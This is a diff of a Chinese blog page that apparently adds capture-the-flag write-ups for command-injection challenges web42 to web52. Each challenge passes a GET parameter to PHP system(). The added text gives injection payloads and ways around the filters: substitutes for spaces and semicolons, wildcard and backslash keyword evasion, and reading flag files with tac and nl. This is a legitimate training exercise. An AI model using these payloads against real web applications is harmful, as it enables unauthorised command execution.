@@ -485,21 +485,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-23
+                    2022-12-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.3k
+                    4.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    20 分
                 </div>
                 
 
@@ -811,6 +811,47 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>过滤了冒号，不能用伪协议了，没有过滤英文状态的**()** 和**;**可以试试用无参函数:<br><em><strong>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></em></p>
 <p><em><strong>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(FILE)))));</strong></em><br><strong>show_source</strong> 与 <strong>highlight_file</strong> 可以互换。<br>得到flag。</p>
+<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+ 
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<pre><code>&gt;/dev/null 2&gt;&amp;1
+&gt;默认情况是1，也就是等同于1&gt;/dev/null 2&gt;&amp;1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”。要想绕过这个“黑洞“，需要往里面传入两个参数，shell会执行第一个参数，将第二个参数带入到黑洞。
+</code></pre>
+</blockquote>
+<p>所以构造 ：<br><code>?c=ls;ls(第二个参数可以写可以不写，但一定要加分号。代表分号前面是第一个参数。)</code><br>接着看到flag.php，然后构造<br><code>?c=tac flag.php;</code><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/2df7d753a2be42d4b6167d2f62e641a9.png" alt="42"><br>关于<strong>linux中&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1和2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null</strong>请<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kexianting/p/11630085.html">点击链接</a></p>
+<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>与web42相比，就多过滤了分号和cat。</p>
+<blockquote>
+<p>分号的代替：<br>%26  	 %0a  	 ||<br>cat的代替就很多了:<br>tac tail nl  sort  uniq	head more less等</p>
+</blockquote>
+<p>构造：<br><code>?c=tac flag.php%0a</code><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/cd8e9c47e22b4d2186c3b65831fd18ed.png" alt="43"></p>
+<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p>构造<code>?c=tac fla\g.php%0a</code><br>flag被过滤，用fla?.php或fla*或fla\g.php<br><img src="https://img-blog.csdnimg.cn/cd533af3fd0546499f6ec5c5ccab36ab.png" alt="44"></p>
+<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>空格被过滤了</p>
+<blockquote>
+<p>空格的代替：<br>%09<br>%20<br>$IFS<br>${IFS}<br>$IFS$9<br>&lt;<br>&lt;&gt;</p>
+</blockquote>
+<p>构造：<br><code>?c=tac%09fl\ag.php%26</code><br><img src="https://img-blog.csdnimg.cn/ef07d9f8a7de4bb3a1f66651f7927080.png" alt="45"></p>
+<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>新过滤了*$和数字<br>仍然可以构造<code>?c=tac%09fl\ag.php%26</code>其中%09，%26不受数字被过滤的影响，因为在加载时%09，%26会被解码为空格和分号，也就没有了数字。</p>
+<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>仍然可以构造<code>?c=tac%09fl\ag.php%26</code></p>
+<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p>仍然可以构造<code>?c=tac%09fl\ag.php%26</code></p>
+<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>仍然可以构造<code>?c=tac%09fl\ag.php%26</code></p>
+<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>过滤了\x09和\x26，是十六进制，相当于过滤了把%09和%26url解码后的\t和&amp;。<br>那么用nl构造<code>?c=nl&lt;&gt;fl\ag.php%0a</code>查看源码得到flag。<br><img src="https://img-blog.csdnimg.cn/2711a133cca1468d9c6abf47edf4c596.png" alt="50"></p>
+<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>用nl构造<code>?c=nl&lt;&gt;fl\ag.php%0a</code>查看源码得到flag。</p>
+<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>过滤了&lt;&gt;，放开了$。<br>构造<br><img src="https://img-blog.csdnimg.cn/f6af93b9f8184e2fac3ac26887309258.png" alt="51"><br>显示假的flag。<br><img src="https://img-blog.csdnimg.cn/d42ab57d32d045f280099f2d39ade197.png" alt="52"></p>
+<p>构造</p>
+<p><img src="https://img-blog.csdnimg.cn/5239125221384771978e45ffa48aa32a.png" alt="52"></p>
+<p>没有flag。<br>加个反引号构造</p>
+<p><img src="https://img-blog.csdnimg.cn/a0f0ec1b687a4c9bb9c58262da2c2893.png" alt="52"><br>假的flag<br><img src="https://img-blog.csdnimg.cn/84c0438b30b645e3b9aa4f2fe6d86feb.png" alt="52"></p>
+<p>打开根目录查看：</p>
+<p><img src="https://img-blog.csdnimg.cn/544786daf0d548bcb21a19e559b8fff1.png" alt="52"></p>
+<p><img src="https://img-blog.csdnimg.cn/7ccadf2e2cdc4d1cad6a66f14f0f46e5.png" alt="52"></p>
+<p>等价于<code>?c=ls /;</code>其中“&#x2F;”是根目录。说明flag在根目录下<br>移动flag到吧.txt文件中，构造：<br><img src="https://img-blog.csdnimg.cn/be5efde9753041b7b3e09b29a91ecf29.png" alt="52"><br>查看b.txt<br><img src="https://img-blog.csdnimg.cn/49168164263d4d93a5d74996b5bffe30.png" alt="52"><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/7d1d0459de804272ae8aea67cfe41784.png" alt="52"></p>
 
                 
             </div>
@@ -1662,7 +1703,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8k</span>&nbsp;字
+                class="white-color">8.6k</span>&nbsp;字
             
             
             
